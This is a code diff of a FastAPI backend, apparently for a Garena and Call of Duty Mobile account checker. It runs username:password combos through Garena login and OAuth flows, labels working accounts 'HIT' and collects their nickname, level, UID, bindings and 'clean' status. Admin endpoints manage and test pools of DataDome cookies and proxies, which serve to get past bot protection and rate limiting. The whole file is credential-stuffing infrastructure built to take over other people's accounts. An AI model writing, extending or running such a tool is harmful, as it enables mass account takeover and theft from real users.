-            detail = (
-                "Prelogin failed — account does not exist"
-                if not datadome
-                else "Prelogin failed — DataDome cookie may be expired or IP blocked"
-            )
+            detail = ("Prelogin failed — account does not exist" if not datadome
+                      else "Prelogin failed — DataDome expired or IP blocked")
             return CheckOneResponse(combo=combo, status="bad", detail=detail)
 
-        # Step 2: Login
-        sso_key, login_status = _login(session, account, password, v1, v2)
+        sso_key, _ = _login(session, account, password, v1, v2)
         if not sso_key:
-            return CheckOneResponse(
-                combo=combo, status="bad",
-                detail="Wrong password or account suspended",
-            )
+            return CheckOneResponse(combo=combo, status="bad", detail="Wrong password or account suspended")
 
-        # Step 3: Account info
         info = _account_info(session, sso_key)
-        acc = _parse_account(info) if info else {
-            "shell": "", "country": "", "is_clean": False, "binds": [], "two_step": False, "email": ""
-        }
+        acc = _parse_account(info) if info else {"shell": "", "country": "", "is_clean": False, "binds": []}
 
-        # Step 4: CODM access token — new flow first, old as fallback
         access_token = _codm_token_new(session, sso_key)
         old_flow = False
         if not access_token:
@@ -681,146 +569,176 @@ def _do_check_sync(req: CheckOneRequest) -> CheckOneResponse:
             old_flow = True
 
         if not access_token:
-            return CheckOneResponse(
-                combo=combo,
-                status="valid_no_codm",
-                detail="Valid Garena account — CODM token fetch failed",
-                shell=acc["shell"],
-                country=acc["country"],
-                is_clean=acc["is_clean"],
-                binds=acc.get("binds", []),
-            )
+            return CheckOneResponse(combo=combo, status="valid_no_codm",
+                detail="Valid Garena — CODM token failed",
+                shell=acc["shell"], country=acc["country"],
+                is_clean=acc["is_clean"], binds=acc.get("binds", []))
 
-        # Step 5: OAuth callback
         cb = _codm_callback(session, access_token, old_flow=old_flow)
         if not cb or cb.get("status") == "no_codm":
-            return CheckOneResponse(
-                combo=combo,
-                status="valid_no_codm",
-                detail="Valid Garena account — No CODM linked",
-                shell=acc["shell"],
-                country=acc["country"],
-                is_clean=acc["is_clean"],
-                binds=acc.get("binds", []),
-            )
+            return CheckOneResponse(combo=combo, status="valid_no_codm",
+                detail="Valid Garena — No CODM linked",
+                shell=acc["shell"], country=acc["country"],
+                is_clean=acc["is_clean"], binds=acc.get("binds", []))
 
-        # Step 6: CODM user info
         user = _codm_user_info(session, cb["token"], old_flow=old_flow)
-
         return CheckOneResponse(
-            combo=combo,
-            status="hit",
+            combo=combo, status="hit",
             nickname=str(user.get("codm_nickname") or user.get("nickname") or ""),
             level=str(user.get("codm_level") or ""),
             region=str(user.get("region") or ""),
             uid=str(user.get("uid") or ""),
-            shell=acc["shell"],
-            country=acc["country"],
-            is_clean=acc["is_clean"],
-            binds=acc.get("binds", []),
+            shell=acc["shell"], country=acc["country"],
+            is_clean=acc["is_clean"], binds=acc.get("binds", []),
             detail="HIT",
         )
-
     except Exception as e:
         logger.error(f"CODM check error for {account}: {e}")
-        return CheckOneResponse(
-            combo=combo, status="error",
-            detail=f"Server error: {str(e)[:120]}",
-        )
+        return CheckOneResponse(combo=combo, status="error", detail=f"Server error: {str(e)[:120]}")
     finally:
-        try:
-            session.close()
-        except Exception:
-            pass
+        try: session.close()
+        except Exception: pass
 
 
-# ─────────────────────────────────────────────────────────────
-#  Admin — Cookie pool endpoints
-# ─────────────────────────────────────────────────────────────
+# ── Admin — Cookie pool endpoints ─────────────────────────────
 
 @router.get("/cookies", dependencies=[Depends(require_admin)])
 async def get_cookies():
     cookies = _get_all_cookies()
-    return {
-        "count":   len(cookies),
-        "source":  "redis" if _redis_get_list(_REDIS_KEY_COOKIES) else "env",
-        "cookies": cookies,
-    }
-
+    return {"count": len(cookies),
+            "source": "redis" if _redis_get_list(_REDIS_KEY_COOKIES) else "env",
+            "cookies": cookies}
 
 @router.post("/cookies", dependencies=[Depends(require_admin)])
 async def set_cookies(req: CookieUpdateRequest):
     cleaned = [l.strip() for l in req.cookies if l.strip()]
     if not cleaned:
-        raise HTTPException(status_code=400, detail="No valid cookie lines provided")
-    ok = _redis_set_list(_REDIS_KEY_COOKIES, cleaned)
-    if not ok:
-        raise HTTPException(status_code=500, detail="Failed to save cookies to Redis")
+        raise HTTPException(400, "No valid cookie lines provided")
+    if not _redis_set_list(_REDIS_KEY_COOKIES, cleaned):
+        raise HTTPException(500, "Failed to save cookies to Redis")
     return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} cookie(s) saved to Redis"}
-
 
 @router.delete("/cookies", dependencies=[Depends(require_admin)])
 async def delete_cookies():
     _redis_del(_REDIS_KEY_COOKIES)
-    return {"message": "✅ Cookie pool cleared from Redis (env fallback still active if set)"}
+    return {"message": "✅ Cookie pool cleared"}
 
 
-# ─────────────────────────────────────────────────────────────
-#  Admin — Proxy pool endpoints
-# ─────────────────────────────────────────────────────────────
+# ── Admin — Proxy pool endpoints ──────────────────────────────
 
 @router.get("/proxies", dependencies=[Depends(require_admin)])
 async def get_proxies():
     proxies = _get_all_proxies()
     return {"count": len(proxies), "proxies": proxies}
 
-
 @router.post("/proxies", dependencies=[Depends(require_admin)])
 async def set_proxies(req: ProxyUpdateRequest):
     cleaned = [l.strip() for l in req.proxies if l.strip()]
     if not cleaned:
-        raise HTTPException(status_code=400, detail="No valid proxy lines provided")
-    ok = _redis_set_list(_REDIS_KEY_PROXIES, cleaned)
-    if not ok:
-        raise HTTPException(status_code=500, detail="Failed to save proxies to Redis")
+        raise HTTPException(400, "No valid proxy lines provided")
+    if not _redis_set_list(_REDIS_KEY_PROXIES, cleaned):
+        raise HTTPException(500, "Failed to save proxies to Redis")
     return {"saved": len(cleaned), "message": f"✅ {len(cleaned)} proxy(ies) saved to Redis"}
-
 
 @router.delete("/proxies", dependencies=[Depends(require_admin)])
 async def delete_proxies():
     _redis_del(_REDIS_KEY_PROXIES)
-    return {"message": "✅ Proxy pool cleared from Redis"}
+    return {"message": "✅ Proxy pool cleared"}
 
 
-# ─────────────────────────────────────────────────────────────
-#  Endpoint: POST /api/codm/check-one
-#
-#  FIX v4.2: Runs blocking requests in ThreadPoolExecutor so
-#  FastAPI's async event loop is NOT blocked.
-#  Server-side watchdog: asyncio.wait_for(timeout=55s) so the
-#  response always arrives before Flutter's 90s client timeout.
-# ─────────────────────────────────────────────────────────────
+# ── Health check endpoints (NEW v4.3) ─────────────────────────
+
+@router.post("/test-cookie", response_model=TestCookieResponse,
+             dependencies=[Depends(require_admin)])
+async def test_cookie(req: TestCookieRequest):
+    """Test one DataDome cookie from Railway's IP via a live Garena request."""
+    if not _HAS_CLOUDSCRAPER:
+        return TestCookieResponse(cookie=req.cookie, ok=False,
+                                  detail="cloudscraper not installed on server")
+    loop = asyncio.get_event_loop()
+    try:
+        return await asyncio.wait_for(
+            loop.run_in_executor(_executor, _check_cookie_sync, req.cookie),
+            timeout=15.0)
+    except asyncio.TimeoutError:
+        return TestCookieResponse(cookie=req.cookie, ok=False,
+                                  detail="Test timed out (15s)")
+
+
+@router.post("/test-proxy", response_model=TestProxyResponse,
+             dependencies=[Depends(require_admin)])
+async def test_proxy(req: TestProxyRequest):
+    """Test one proxy by routing a Garena request through it from Railway's IP."""
+    loop = asyncio.get_event_loop()
+    try:
+        return await asyncio.wait_for(
+            loop.run_in_executor(_executor, _check_proxy_sync, req.proxy),
+            timeout=15.0)
+    except asyncio.TimeoutError:
+        return TestProxyResponse(proxy=req.proxy, ok=False,
+                                 detail="Test timed out (15s)")
+
+
+@router.post("/test-cookies", dependencies=[Depends(require_admin)])
+async def test_cookies_batch(req: BatchTestCookiesRequest):
+    """
+    Batch-test all provided cookies concurrently from Railway's IP.
+    Returns list of results — order may differ from input (as_completed).
+    """
+    if not _HAS_CLOUDSCRAPER:
+        return [{"cookie": c, "ok": False, "status_code": 0,
+                 "latency_ms": 0, "detail": "cloudscraper not installed"} for c in req.cookies]
+    loop = asyncio.get_event_loop()
+    # Map futures back to original cookies for timeout error reporting
+    future_to_cookie = {
+        loop.run_in_executor(_executor, _check_cookie_sync, c): c
+        for c in req.cookies
+    }
+    results = []
+    for future in asyncio.as_completed(list(future_to_cookie.keys())):
+        cookie = future_to_cookie[future]
+        try:
+            r = await asyncio.wait_for(asyncio.shield(future), timeout=15.0)
+            results.append(r.dict())
+        except (asyncio.TimeoutError, Exception):
+            results.append({"cookie": cookie, "ok": False, "status_code": 0,
+                            "latency_ms": 15000, "detail": "Timed out"})
+    return results
+
+
+@router.post("/test-proxies", dependencies=[Depends(require_admin)])
+async def test_proxies_batch(req: BatchTestProxiesRequest):
+    """Batch-test all provided proxies concurrently from Railway's IP."""
+    loop = asyncio.get_event_loop()
+    future_to_proxy = {
+        loop.run_in_executor(_executor, _check_proxy_sync, p): p
+        for p in req.proxies
+    }
+    results = []
+    for future in asyncio.as_completed(list(future_to_proxy.keys())):
+        proxy = future_to_proxy[future]
+        try:
+            r = await asyncio.wait_for(asyncio.shield(future), timeout=15.0)
+            results.append(r.dict())
+        except (asyncio.TimeoutError, Exception):
+            results.append({"proxy": proxy, "ok": False,
+                            "latency_ms": 15000, "detail": "Timed out"})
+    return results
+
+
+# ── Main endpoint ─────────────────────────────────────────────
 
 @router.post("/check-one", response_model=CheckOneResponse)
 async def check_one(req: CheckOneRequest):
     if not _HAS_CLOUDSCRAPER or not _HAS_CRYPTO:
-        return CheckOneResponse(
-            combo=req.combo,
-            status="error",
-            detail="Server missing deps: cloudscraper or pycryptodome. Contact admin.",
-        )
-
+        return CheckOneResponse(combo=req.combo, status="error",
+            detail="Server missing deps: cloudscraper or pycryptodome.")
     loop = asyncio.get_event_loop()
     try:
-        result = await asyncio.wait_for(
+        return await asyncio.wait_for(
             loop.run_in_executor(_executor, _do_check_sync, req),
-            timeout=55.0,   # server-side cap — well under Flutter's 90s
-        )
-        return result
+            timeout=55.0)
     except asyncio.TimeoutError:
-        logger.warning(f"CODM check-one timed out for combo: {req.combo[:30]}...")
-        return CheckOneResponse(
-            combo=req.combo,
-            status="error",
-            detail="Server timeout (55s) — Garena may be rate-limiting. Try again or add a proxy.",
-        )
+        logger.warning(f"check-one timeout: {req.combo[:30]}")
+        return CheckOneResponse(combo=req.combo, status="error",
+            detail="Server timeout (55s) — Garena rate-limiting. Try proxy.")
